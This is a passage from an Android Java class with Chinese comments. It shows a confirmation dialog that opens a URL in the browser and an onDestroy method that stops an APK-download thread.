        //设置按钮
        normalDialog.setPositiveButton("确定", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                startBrowser(url);
            }
        });

        normalDialog.show();
    }

    /**
     * 调用浏览器
     */

    private void startBrowser(String url) {
        Intent intent = new Intent();
        intent.setAction(Intent.ACTION_VIEW);
        Uri content_url = Uri.parse(url);
        intent.setData(content_url);
        intent.addCategory(Intent.CATEGORY_BROWSABLE);
        startActivity(intent);
    }




    @Override
    public void onDestroy() {
        super.onDestroy();
        if (downloadApkThread != null) {
            downloadApkThread.interrupt();
            downloadApkThread = null;
        }
    }



}
